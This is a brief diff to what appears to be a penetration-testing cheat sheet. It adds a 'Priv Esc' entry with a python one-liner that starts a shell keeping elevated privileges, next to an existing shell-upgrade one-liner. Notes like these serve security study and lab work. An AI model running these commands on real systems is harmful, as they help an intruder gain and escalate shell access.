@@ -15,3 +15,7 @@
 ### Upgrade the shell  
 `python -c 'import pty; pty.spawn("/bin/bash")'`
 
+### Priv Esc
+
+`python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
+
